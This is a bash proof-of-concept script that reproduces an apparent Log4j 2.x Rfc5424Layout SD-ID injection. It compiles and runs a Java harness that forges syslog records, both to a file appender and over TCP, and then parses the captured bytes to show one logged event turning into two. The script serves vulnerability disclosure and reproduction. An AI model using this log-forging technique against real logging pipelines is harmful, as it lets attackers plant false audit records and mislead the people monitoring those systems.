#!/usr/bin/env bash
#
# Reproduce LOG4J-SDID-INJECTION (Apache Log4j 2.x Rfc5424Layout SD-ID injection).
#
#   ./run_poc.sh [jars-dir]
#
# jars-dir must contain log4j-api-<v>.jar and log4j-core-<v>.jar. If it is
# missing, the script fetches 2.26.1 from Maven Central into ./jars.
#
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
JARS="${1:-$HERE/jars}"
VERSION="${LOG4J_VERSION:-2.26.1}"
PORT="${SYSLOG_PORT:-5140}"

mkdir -p "$JARS"
need=0
for a in log4j-api log4j-core; do
  [ -f "$JARS/$a-$VERSION.jar" ] || need=1
done
if [ "$need" = 1 ] && command -v curl >/dev/null 2>&1; then
  BASE="https://repo1.maven.org/maven2/org/apache/logging/log4j"
  for a in log4j-api log4j-core; do
    curl -fsSL --max-time 60 -o "$JARS/$a-$VERSION.jar" \
      "$BASE/$a/$VERSION/$a-$VERSION.jar"
  done
fi

CP="$JARS/log4j-api-$VERSION.jar:$JARS/log4j-core-$VERSION.jar"
for a in log4j-api log4j-core; do
  if [ ! -f "$JARS/$a-$VERSION.jar" ]; then
    echo "missing $JARS/$a-$VERSION.jar -- pass a jars-dir as \$1" >&2
    exit 2
  fi
done

cd "$HERE"
javac -proc:none -cp "$CP" -d . SdIdPoC.java

echo "=============================================================="
echo " Log4j $VERSION -- LOG4J-SDID-INJECTION"
echo "=============================================================="

echo
echo "--- A. file appender, newLineEscape enabled ---"
for mode in baseline breakout crlf; do
  java -cp "$CP:." -Dlog4j.configurationFile="$HERE/log4j2-rfc5424-sdid.xml" SdIdPoC "$mode" >/dev/null 2>&1
  echo "  mode=$mode"
  sed 's/^/    /' out-sdid.txt | cat -A | sed 's/\$$/<LF>/'
done

echo
echo "--- B. network syslog over TCP (RFC 6587) ---"
python3 tcp_sink.py "$PORT" "$HERE/wire.bin" 8 > "$HERE/sink.log" 2>&1 &
SINK=$!
sleep 2
java -cp "$CP:." -DsyslogPort="$PORT" -Dlog4j.configurationFile="$HERE/log4j2-syslog-tcp.xml" SdIdPoC forge32 >/dev/null 2>&1
wait $SINK || true

echo "  raw bytes on the wire:"
cat -A "$HERE/wire.bin" | sed 's/^/    /'
echo
echo "  what a line-oriented collector ingests:"
python3 - "$HERE/wire.bin" <<'PY'
import sys
data = open(sys.argv[1], 'rb').read()
for i, line in enumerate(x for x in data.split(b'\n') if x.strip()):
    s = line.decode('utf-8', 'replace')
    print(f"    record {i}: {s!r}")
    if s.startswith('<'):
        p = s.index('>')
        fields = s[p + 1:].split(' ', 6)
        print(f"      PRI       : {s[:p + 1]}")
        for name, val in zip(
            ['VERSION', 'TIMESTAMP', 'HOSTNAME', 'APP-NAME', 'PROCID', 'MSGID'], fields[:6]
        ):
            print(f"      {name:<10}: {val}")
        tail = fields[6] if len(fields) > 6 else ''
        sd, _, msg = tail.partition(' ')
        print(f"      SD        : {sd}")
        print(f"      MSG       : {msg}")
PY
echo
echo "Done. Expect two records where one was logged: the forged one is attacker-authored."
